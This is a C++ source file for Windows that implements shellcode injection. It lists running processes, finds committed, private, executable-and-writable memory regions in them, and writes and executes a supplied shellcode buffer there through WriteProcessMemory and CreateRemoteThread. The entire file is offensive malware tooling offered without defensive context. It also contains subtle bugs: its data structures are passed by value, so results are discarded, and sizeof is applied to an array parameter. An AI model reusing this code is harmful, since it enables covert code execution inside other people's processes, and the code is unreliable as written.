#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <string>
#include <deque>


struct Process_Info {
	DWORD pid;
	WCHAR* procName;
	PVOID mAddress;
	HANDLE handle;
	BOOLEAN canInject ;
} ;

VOID GetProcessesAndDuplicate(std::deque <Process_Info> processesInfo)
{
	DWORD procID;
	WCHAR* procName;
	HANDLE hProcess;
	HANDLE duplicatedHandle;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnap != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 procEntry;
		procEntry.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(hSnap, &procEntry))
		{
			do
			{
				DWORD procID = procEntry.th32ProcessID;
				hProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, procID);
				if (DuplicateHandle(GetCurrentProcess(),hProcess,GetCurrentProcess(),&duplicatedHandle,0,0,DUPLICATE_SAME_ACCESS)) 
				{
					procName = procEntry.szExeFile;
					std::wcout << L"Process Name : " << procName << "\n";
					CloseHandle(hProcess);
					processesInfo.push_back({
						procID,
						procName,
						NULL,
						duplicatedHandle,
						false
					});
					continue;
				}
			} while (Process32Next(hSnap, &procEntry));
		}
	}
	CloseHandle(hSnap);
}

VOID FindInjectableProcesses(std::deque <Process_Info> processesInfo)
{
	for (int i = 0; i < processesInfo.size(); i++) 
	{
		LPVOID offset = 0;
		MEMORY_BASIC_INFORMATION mbi = {};
		
		while (VirtualQueryEx(processesInfo[i].handle, offset, &mbi, sizeof(mbi)))
		{
			offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
			if (mbi.Protect == PAGE_EXECUTE_READWRITE &&
				mbi.State == MEM_COMMIT &&
				mbi.Type == MEM_PRIVATE)
			{
				processesInfo[i].mAddress = mbi.BaseAddress;
				processesInfo[i].canInject = true;
				break;
			}
		}
	}
}

VOID InjectShellcodeIntoProcess(std::deque <Process_Info> processesInfo, unsigned char shellcode[])
{
	for (int i = 0; i < processesInfo.size(); i++)
	{
		if (processesInfo[i].canInject)
		{
			WriteProcessMemory(processesInfo[i].handle, processesInfo[i].mAddress, shellcode, sizeof(shellcode), NULL);
			CreateRemoteThread(processesInfo[i].handle, NULL, 0, (LPTHREAD_START_ROUTINE)processesInfo[i].mAddress, NULL, 0, NULL);
		}
	}
}







